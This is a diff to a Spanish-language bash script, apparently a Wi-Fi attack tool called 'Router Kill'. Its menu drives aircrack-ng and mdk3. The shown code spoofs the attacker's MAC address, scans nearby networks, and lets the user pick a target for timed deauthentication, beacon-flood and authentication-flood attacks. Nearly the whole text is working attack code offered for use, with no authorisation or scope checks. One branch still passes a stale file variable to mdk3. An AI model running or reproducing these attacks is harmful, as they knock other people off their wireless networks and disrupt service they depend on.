@@ -25,32 +25,35 @@ mon="mon"
 
 
 function ctrl_c() {
-echo -e "$nc($azul*$nc)$verde Presionaste la tecla$rojo CTRL + C$verde Saliendo del Programa.."
+echo
+echo -e "$amarillo[*]$blanco  Presionaste la tecla CTRL + C.. saliendo del programa..."
 sleep 2
 checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
 #Verification mode monitor and exit
-if [[ $checkmode == *wlan0mon* ]] 
+if [[ $checkmode == *wlan0* ]] 
 then
-airmon-ng stop wlan0mon
-echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
-sleep 1
+airmon-ng stop wlan0
+echo -e "$amarillo[*]$blanco  Deteniendo modo monitor"
+sleep 4
 fi
 
-if [[ $checkmode == *eth0mon* ]] 
+if [[ $checkmode == *eth0* ]] 
 then
-airmon-ng stop eth0mon
-echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
-sleep 1
+airmon-ng stop eth0
+echo -e "$amarillo[*]$blanco  Deteniendo modo monitor..."
+sleep 2
 fi
 
-if [[ $checkmode == *wlan1mon* ]] 
+if [[ $checkmode == *wlan1* ]] 
 then
-airmon-ng stop wlan1mon
-echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
-sleep 1
+airmon-ng stop wlan1
+echo -e "$verde[+]$blanco  Modo monitor detenido..."
+sleep 4
+echo
 fi
-echo -e "$nc($azul*$nc)$verde Gracias por usar nuestro Script $azul by Facu Salgado..$nc"
-sleep 1
+clear
+echo -e "$amarillo[*]$blanco  Gracias por utilizar nuestro script.. saliendo.."
+sleep 3
 exit
 
 }
@@ -85,15 +88,15 @@ esac
 
 #Opciones menu
 
-a=$'\e[1;35mDeauth Atack\e[01;32m'
-b=$'\e[1;35mFake Point\e[01;32m'
-c=$'\e[1;35mAuth Atttack\e[01;32m'
-new=$'\e[1;35mInject Packets\e[01;32m'
-d=$'\e[1;35mStop monitor mode\e[01;32m'
-e=$'\e[1;35mCapture Handshake\e[01;32m'
-new2=$'\e[1;35mWeb Attacks\e[01;32m'
-update=$'\e[1;35mUpdate Program\e[01;32m'
-f=$'\e[1;35mExit Program\e[01;32m'
+a=$'\033[1;37mDeauth Atack\e[01;32m' 
+b=$'\033[1;37mFake Point\e[01;32m'
+c=$'\033[1;37mauth Atttack\e[01;32m'
+new=$'\033[1;37mInject Packets\e[01;32m'
+d=$'\033[1;37mStop monitor mode\e[01;32m'
+e=$'\033[1;37mCapture Handshake\e[01;32m'
+new2=$'\033[1;37m web Attacks\e[01;32m'
+update=$'\033[1;37mUpdate Program\e[01;32m'
+f=$'\033[1;37mexit Program\e[01;32m'
 
 
 #opciones MENU
@@ -119,7 +122,7 @@ if [[ $EUID -ne 0 ]]; then
 echo -e "$nc($violeta2*$nc)$rojo ERROR:$azul No eres usuario$rojo root"		
 exit 1
 fi
-
+clear
 #airmon-ng
 if which airmon-ng >/dev/null; then
 sleep 0.25
@@ -190,8 +193,9 @@ sleep 2
 echo -e "$violeta2(*)$azul Script creado por$rojo Facu Salgado"
 sleep 1
 echo -e "$violeta2(*)$azul Regalanos una estrella en github$verde"
+echo
 
-export PS3=$'\e[01;35m(*)\e[01;32m Elige una Opcion:\e[01;33m '
+export PS3=$'\033[1;33m(*)\e[01;32m Elige una Opcion:\e[01;33m '
 
 
 
@@ -491,54 +495,182 @@ do
 case $menu in 
 
 $a)
-echo -e "$nc($azul*$nc)$verde Este Ataque desautenticara todos los clientes dentro de la red"
-sleep 2
-echo -e "$nc($azul*$nc)$verde le mostraremos sus interfaces de red disponibles"
-sleep 2
+echo
+echo -e "$amarillo[*]$blanco  Este Ataque desautenticara todos los clientes dentro de la red"
+sleep 4
+echo
+echo -e "$amarillo[*]$blanco le mostraremos sus interfaces de red disponibles.."
+sleep 4
 echo
 echo
-ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
 sleep 1
-printf "\e[01;35m Escriba su interface:\e[01;32m "
-read interface
+
+mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
+
+if [ "${#interfaces[@]}" -eq 0 ]; then
+    echo -e  "$rojo[-]$blanco No se encontraron interfaces inalámbricas.. conecte un adaptador USB WIFI"
+    sleep 2
+    return
+fi
+
+while true; do
+    clear
+    echo -e "\n$amarillo Interfaces inalámbricas disponibles:\n"
+
+    i=1
+    for iface in "${interfaces[@]}"; do
+        echo -e  "$verde $i) $blanco $iface"
+        ((i++))
+    done
+
+    echo
+    printf "\e[1;37m Selecciona el número de la interfaz: \e[1;32m: " 
+    read iface_choice
+
+    # Validación
+    if ! [[ "$iface_choice" =~ ^[0-9]+$ ]]; then
+        echo -e "$rojo[-]$blanco Debe ingresar un número"
+        sleep 2
+        continue
+    fi
+
+    if [ "$iface_choice" -lt 1 ] || [ "$iface_choice" -gt "${#interfaces[@]}" ]; then
+        echo -e "$rojo[-]$blanco Selección inválida$verde"
+        sleep 2
+        continue
+    fi
+
+    # Si llega acá, es válido
+    interface="${interfaces[$((iface_choice-1))]}"
+    echo
+    echo -e "[+]$amarillo Interfaz seleccionada:$verde $interface"
+    sleep 3
+    echo
+    break
+done
+
 #cambio de dirección mac
-echo -e "$nc($azul*$nc)$verde A continuacion daremos de baja tu interfaz para falsificar tu MAC"
-sleep 2
+echo -e "$verde[+]$blanco A continuacion daremos de baja tu interfaz para falsificar tu MAC"
+sleep 3
 ifconfig $interface down
-echo -e "$nc($azul*$nc)$verde Falsificando tu MAC!!"
-sleep 2
+echo
+echo -e "$verde[+]$blanco Falsificando tu MAC!!"
+sleep 3
 macchanger -r $interface
 ifconfig $interface up
-echo -e "$nc($azul*$nc)$verde TU direccion MAC fue falsificada correctamente!!"
-sleep 2
-echo -e "$nc($azul*$nc)$verde Ahora iniciaremos el modo monitor en tu interfaz"
-sleep 2
+echo
+echo -e "$verde[+]$blanco TU direccion MAC fue falsificada correctamente!!"
+sleep 3
+echo -e "$amarillo[*]$blanco iniciando modo monitor... aguarde.."
+sleep 4
 airmon-ng start $interface
 pkill dhclient && pkill wpa_supplicant
-echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
+echo -e "$verde[+]$blanco  Modo monitor iniciado correctamente.."
+sleep 5
+clear
 sleep 2
-echo -e "$nc($azul*$nc)$verde Ahora haremos un analisis de las redes disponibles"
-sleep 2
-echo -e "$nc($azul*$nc)$rojo AVISO: Espera 10 segundos$verde cuando inicie el analisis"
+echo -e "$amarillo[*]$blanco iniciando escaneo de redes disponibles.."
+sleep 4
+echo
+echo -e "$amarillo[*]$blanco Espere unos 15 segundos despues que inicie el escaneo..."
 sleep 9
-timeout --foreground 12s airodump-ng $interface$mon
+timeout --foreground 20s airodump-ng $interface 
+dump_prefix="/tmp/scan_$(date +%s)"
+airodump-ng --write "$dump_prefix" --output-format csv "$interface" &
+airodump_pid=$!
+
+sleep 12
+kill $airodump_pid
+
+
+csv_file="${dump_prefix}-01.csv"
+
+mapfile -t networks < <(
+    awk -F',' '
+    BEGIN { found=0 }
+    /^BSSID,/ { found=1; next }
+    found && $1 != "" && $14 != "" {
+        gsub(/^[ \t]+|[ \t]+$/, "", $1)
+        gsub(/^[ \t]+|[ \t]+$/, "", $4)
+        gsub(/^[ \t]+|[ \t]+$/, "", $6)
+        gsub(/^[ \t]+|[ \t]+$/, "", $14)
+        printf "%s|%s|%s|%s\n", $1, $4, $6, $14
+    }
+    ' "$csv_file"
+)
+
+if [ "${#networks[@]}" -eq 0 ]; then
+    echo -e "$rojo[-]$blanco No se encontraron redes en el escaneo"
+    sleep 2
+    return
+fi
+
+while true; do
+    clear
+    echo -e "$amarillo Redes detectadas:$amarillo\n"
+
+    i=1
+    for net in "${networks[@]}"; do
+        IFS='|' read -r nbssid nch nenc nessid <<< "$net"
+        printf "$blanco%d) %-20s$blanco  CH: $amarillo%-3s$blanco  %-6s$amarillo  %s$blanco\n" "$i" "$nbssid" "$nch" "$nenc" "$nessid"
+        ((i++))
+    done
+
+    echo
+    read -p "Seleccione el número de la red: " net_choice
+
+    if ! [[ "$net_choice" =~ ^[0-9]+$ ]]; then
+        echo -e "$rojo[-]$blanco Debe ingresar un número"
+        sleep 2
+        continue
+    fi
+
+    if [ "$net_choice" -lt 1 ] || [ "$net_choice" -gt "${#networks[@]}" ]; then
+        echo -e "$rojo[-]$blanco Selección inválida"
+        sleep 2
+        continue
+    fi
+
+    selected="${networks[$((net_choice-1))]}"
+    IFS='|' read -r bssid ch enc essid <<< "$selected"
+
+    echo
+    echo -e "$verde[+]$blanco Red seleccionada:"
+    echo -e "    BSSID :$amarillo $bssid $blanco"
+    echo -e "    Canal :$amarillo $ch $blanco"
+    echo -e "    ENC   :$amarillo $enc $blanco"
+    echo -e "    ESSID :$amarillo $essid $blanco"
+    sleep 2
+    break
+done
 echo
 echo
-printf "\e[01;35m Escriba el BSSID de la red:\e[01;32m "
-read bssid
-printf "\e[01;35m Escriba el canal de la red (CH):\e[01;32m "
-read ch
+while true; do
+    printf "\033[1;37mAñade duración del ataque en segundos: "
+    read -r sec
+
+    if [[ "$sec" =~ ^[1-9][0-9]*$ ]]; then
+        break
+    else
+        echo -e "$rojo[-]$blanco Debe ser un numero mayor a 0"
+    fi
+done
+
+
+tmp_bssid_file="/tmp/mdk3_bssid.txt"
+echo "$bssid" > "$tmp_bssid_file"
+
+
+
+
+
+
+
 sleep 2
-printf "\e[01;35m Escriba el nombre txt para guardar el BSSID:\e[01;32m "
-read doc
-echo $bssid > $doc
-sleep 2
-printf "\e[01;35m Añade la duracion del ataque en segundos:\e[01;32m "
-read sec
-sleep 2
-echo -e "$nc($azul*$nc)$verde El ataque sera realizado al BSSID:$azul $bssid $verde En el Canal: $ch"
-sleep 2
-echo -e "$nc($azul*$nc)$verde el ataque Iniciara en 5 segundos.."
+echo -e "$amarillo[*]$blanco El ataque sera realizado al BSSID:$amarillo $bssid $blanco En el Canal:$amarillo $ch"
+sleep 4
+echo
+echo -e "$amarillo[*]$blanco El ataque iniciara en 5 segundos.."
 sleep 1
 echo "4 segundos.."
 sleep 1
@@ -548,42 +680,107 @@ echo "2 segundos.."
 sleep 1
 echo "1 segundo"
 sleep 1
-echo -e "$nc($azul*$nc)$rojo Ataque Iniciado..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
-timeout --foreground $sec$s mdk3 $interface$mon d -b $doc -c $ch
-echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
+echo -e "$verde[+]$blanco Ataque iniciado.. tiempo restante de ataque: $amarillo $sec $blanco segundos"
+timeout --foreground $sec$s mdk3 $interface d -b $tmp_bssid_file -c $ch
+echo -e "$verde[+]$blanco Ataque terminado exitosamente.."
+rm -f "$tmp_bssid_file"
 sleep 2
-echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$verde"
-sleep 2
-airmon-ng stop $interface$mon
+echo
+echo -e "$amarillo[*]$blanco Deteniendo modo monitor..."
+sleep 4
+airmon-ng stop $interface
+clear
+echo -e "$amarillo[*]$blanco volviendo al menu principal en 5 segundos"
+sleep 5
+clear
+toilet --filter border Router Kill | lolcat
+echo
+sleep 3
+echo
 menu_principal
 ;;
 
 $b)
 
-
-echo -e "$nc($azul*$nc)$verde Este Ataque Creara un flood de redes WIFI"
-sleep 2
-echo -e "$nc($azul*$nc)$verde le mostraremos sus interfaces de red disponibles"
-sleep 2
-echo
-echo
-ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
+clear
 sleep 1
+echo -e "$amarillo[*]$blanco Este ataque creara falsas redes Wifi..."
+sleep 4
 echo
-printf "\e[01;35m Escriba su interfaz:\e[01;32m "
-read interface
-sleep 2
-echo -e "$nc($azul*$nc)$verde Ahora iniciaremos el modo monitor en tu interfaz"
+echo
+echo -e "$amarillo[*]$blanco Detectando interfaces..."
+sleep 3
+
+
+mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
+
+if [ "${#interfaces[@]}" -eq 0 ]; then
+    echo -e  "$rojo[-]$blanco No se encontraron interfaces inalámbricas.. conecte un adaptador USB WIFI"
+    sleep 2
+    return
+fi
+
+while true; do
+    clear
+    echo -e "\n$amarillo Interfaces inalámbricas disponibles:\n"
+
+    i=1
+    for iface in "${interfaces[@]}"; do
+        echo -e  "$verde $i) $blanco $iface"
+        ((i++))
+    done
+
+    echo
+    printf "\e[1;37m Selecciona el número de la interfaz: \e[1;32m: " 
+    read iface_choice
+
+    # Validación
+    if ! [[ "$iface_choice" =~ ^[0-9]+$ ]]; then
+        echo -e "$rojo[-]$blanco Debe ingresar un número"
+        sleep 2
+        continue
+    fi
+
+    if [ "$iface_choice" -lt 1 ] || [ "$iface_choice" -gt "${#interfaces[@]}" ]; then
+        echo -e "$rojo[-]$blanco Selección inválida$verde"
+        sleep 2
+        continue
+    fi
+
+    # Si llega acá, es válido
+    interface="${interfaces[$((iface_choice-1))]}"
+    echo
+    echo -e "[+]$amarillo Interfaz seleccionada:$verde $interface"
+    sleep 3
+    echo
+    break
+done
+
+sleep 1
+echo -e "$amarillo[*]$blanco Iniciando modo monitor... aguarde.."
 sleep 2
 airmon-ng start $interface
 pkill dhclient && pkill wpa_supplicant
-echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
+clear
 echo
-printf "\e[01;35m Escriba tiempo de ataque en segundos:\e[01;32m "
-read sec
+echo -e "$verde[+]$blanco Modo monitor iniciado correctamente.."
+echo
+sleep 3
+while true; do
+    printf "\033[1;37mAñade duración del ataque en segundos:\033[1;32m "
+    read -r sec
+
+    if [[ "$sec" =~ ^[1-9][0-9]*$ ]]; then
+        break
+    else
+        echo -e "$rojo[-]$blanco Debe ser un numero mayor a 0"
+    fi
+done
+
 sleep 2
-echo -e "$nc($azul*$nc)$verde el ataque comenzara en 5 segundos.."
+echo -e "$amarillo[*]$blanco El ataque iniciara en 5 segundos.."
 sleep 1
+echo
 echo "4 segundos"
 sleep 1
 echo "3 segundos"
@@ -592,53 +789,165 @@ echo "2 segundos"
 sleep 1
 echo "1 segundos"
 sleep 1
-echo -e "$nc($azul*$nc)$rojo ATAQUE INICIADO..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
-timeout --foreground $sec$s mdk3 $interface$mon b
-echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
+echo
+echo -e "$verde[+]$blanco Ataque Iniciado.. tiempo restante de ataque:$amarillo $sec$blanco Segundos $nc"
+timeout --foreground $sec$s mdk3 $interface b
+echo
+echo -e "$verde[+]$blanco Ataque finalizado.. $nc"
 sleep 2
-echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$verde"
+echo -e "$verde[+]$blanco deteniendo modo monitor...$nc"
 sleep 2
-airmon-ng stop $interface$mon
+airmon-ng stop $interface
+clear
+echo -e "$amarillo[*]$blanco volviendo al menu principal en 5 segundos.."
+sleep 5
+clear
+toilet --filter border Router Kill | lolcat
+echo
+sleep 3
+echo
 menu_principal
 ;;
 
 
 $c)
-
-echo -e "$nc($azul*$nc)$verde Este Ataque realizara un flood de intentos de conexion al router"
-sleep 2
-echo -e "$nc($azul*$nc)$verde le mostraremos sus interfaces de red disponibles"
-sleep 2
-echo
-echo
-ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
+clear
 sleep 1
-echo
-printf "\e[01;35m EScriba su interfaz:\e[01;32m "
-read interface
+echo -e "$amarillo[*]$blanco Este ataque creara un flood de intentos de conexion al router..."
+sleep 3
+echo -e "$amarillo[*]$blanco detectando interfaces disponibles...."
+mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
+
+if [ "${#interfaces[@]}" -eq 0 ]; then
+    echo -e  "$rojo[-]$blanco No se encontraron interfaces inalámbricas.. conecte un adaptador USB WIFI"
+    sleep 2
+    return
+fi
+
+while true; do
+    clear
+    echo -e "\n$amarillo Interfaces inalámbricas disponibles:\n"
+
+    i=1
+    for iface in "${interfaces[@]}"; do
+        echo -e  "$verde $i) $blanco $iface"
+        ((i++))
+    done
+
+    echo
+    printf "\e[1;37m Selecciona el número de la interfaz: \e[1;32m: " 
+    read iface_choice
+
+    # Validación
+    if ! [[ "$iface_choice" =~ ^[0-9]+$ ]]; then
+        echo -e "$rojo[-]$blanco Debe ingresar un número"
+        sleep 2
+        continue
+    fi
+
+    if [ "$iface_choice" -lt 1 ] || [ "$iface_choice" -gt "${#interfaces[@]}" ]; then
+        echo -e "$rojo[-]$blanco Selección inválida$verde"
+        sleep 2
+        continue
+    fi
+
+    # Si llega acá, es válido
+    interface="${interfaces[$((iface_choice-1))]}"
+    echo
+    echo -e "[+]$amarillo Interfaz seleccionada:$verde $interface"
+    sleep 3
+    echo
+    break
+done
+
 airmon-ng start $interface
 pkill dhclient && pkill wpa_supplicant
-echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
-sleep 2
-echo -e "$nc($azul*$nc)$verde Ahora haremos un analisis de las redes disponibles"
-sleep 2
-echo -e "$nc($azul*$nc)$rojo AVISO: Espera 20 segundos$verde cuando inicie el analisis"
-sleep 9
-timeout --foreground 20s airodump-ng $interface$mon
-echo
-printf "\e[01;35m EScribe el BSSID de la red:\e[01;32m "
-read bssid
-sleep 2
-printf "\e[01;35m Escribe un nombre para guardar en txt\e[01;32m "
-read doc
-echo $bssid > $doc
-echo
-printf "\e[01;35m Añade el canal de la red (CH):\e[01;32m "
-read ch
-printf "\e[01;35m AÑade el ESSID de la red:\e[01;32m "
-read essid	
+clear
 sleep 1
-read -p "Añade la duracion del ataque en segundos ➜ " sec
+echo -e "$verde[+]$blanco modo monitor iniciado correctamente"
+sleep 2
+echo -e "[*]$amarillo $blanco escaneando redes disponibles..."
+sleep 2
+echo
+echo -e "[*]$amarillo $blanco espera 20 segundos despues del escaneo.."
+sleep 10
+timeout --foreground 20s airodump-ng $interface
+
+dump_prefix="/tmp/scan_$(date +%s)"
+airodump-ng --write "$dump_prefix" --output-format csv "$interface" &
+airodump_pid=$!
+
+sleep 12
+kill $airodump_pid
+
+
+csv_file="${dump_prefix}-01.csv"
+
+mapfile -t networks < <(
+    awk -F',' '
+    BEGIN { found=0 }
+    /^BSSID,/ { found=1; next }
+    found && $1 != "" && $14 != "" {
+        gsub(/^[ \t]+|[ \t]+$/, "", $1)
+        gsub(/^[ \t]+|[ \t]+$/, "", $4)
+        gsub(/^[ \t]+|[ \t]+$/, "", $6)
+        gsub(/^[ \t]+|[ \t]+$/, "", $14)
+        printf "%s|%s|%s|%s\n", $1, $4, $6, $14
+    }
+    ' "$csv_file"
+)
+
+if [ "${#networks[@]}" -eq 0 ]; then
+    echo -e "$rojo[-]$blanco No se encontraron redes en el escaneo"
+    sleep 2
+    return
+fi
+
+while true; do
+    clear
+    echo -e "$amarillo Redes detectadas:$amarillo\n"
+
+    i=1
+    for net in "${networks[@]}"; do
+        IFS='|' read -r nbssid nch nenc nessid <<< "$net"
+        printf "$blanco%d) %-20s$blanco  CH: $amarillo%-3s$blanco  %-6s$amarillo  %s$blanco\n" "$i" "$nbssid" "$nch" "$nenc" "$nessid"
+        ((i++))
+    done
+
+    echo
+    read -p "Seleccione el número de la red: " net_choice
+
+    if ! [[ "$net_choice" =~ ^[0-9]+$ ]]; then
+        echo -e "$rojo[-]$blanco Debe ingresar un número"
+        sleep 2
+        continue
+    fi
+
+    if [ "$net_choice" -lt 1 ] || [ "$net_choice" -gt "${#networks[@]}" ]; then
+        echo -e "$rojo[-]$blanco Selección inválida"
+        sleep 2
+        continue
+    fi
+
+    selected="${networks[$((net_choice-1))]}"
+    IFS='|' read -r bssid ch enc essid <<< "$selected"
+
+    echo
+    echo -e "$verde[+]$blanco Red seleccionada:"
+    echo -e "    BSSID :$amarillo $bssid $blanco"
+    echo -e "    Canal :$amarillo $ch $blanco"
+    echo -e "    ENC   :$amarillo $enc $blanco"
+    echo -e "    ESSID :$amarillo $essid $blanco"
+    sleep 2
+    break
+done
+echo
+echo
+printf "\e[1;37mIntroduce el tiempo de ataque en Segundos:\e[01;32m "
+read sec
+tmp_bssid_file="/tmp/mdk3_bssid.txt"
+echo "$bssid" > "$tmp_bssid_file"
+
 sleep 2
 echo -e "$nc($azul*$nc)$verde El ataque comenzara en 5 segundos.."
 sleep 1
@@ -652,12 +961,12 @@ echo "1 segundos"
 sleep 1
 echo -e "$nc($azul*$nc)$rojo Ataque Iniciado..$verde Tiempo restante de ataque:$azul $sec$verde Segundos $nc"
 sleep 2
-timeout --foreground $sec$s mdk3 $interface$mon a -a $doc
+timeout --foreground $sec$s mdk3 $interface a -a $doc
 echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
 sleep 2
 echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$verde"
 sleep 2
-airmon-ng stop $interface$mon
+airmon-ng stop $interface
 menu_principal
 
 
@@ -702,6 +1011,7 @@ printf "\e[01;35m Añade el canal de la red (CH):\e[01;32m "
 read ch
 printf "\e[01;35m Añade duracion del ataque en segundos:\e[01;32m "
 read sec
+
 sleep 2
 echo -e "$nc($azul*$nc)$verde El ataque comenzara en 5 segundos..."
 sleep 1
@@ -876,14 +1186,14 @@ if [[ $checkmode == *eth0mon* ]]
 then
 airmon-ng stop eth0mon
 echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
-sleep 1
+sleep 3
 fi
 
 if [[ $checkmode == *wlan1mon* ]] 
 then
 airmon-ng stop wlan1mon
 echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
-sleep 1
+sleep 4
 fi
 echo -e "$nc($azul*$nc)$verde Gracias por usar nuestro Script $azul by Facu Salgado..$nc"
 sleep 2
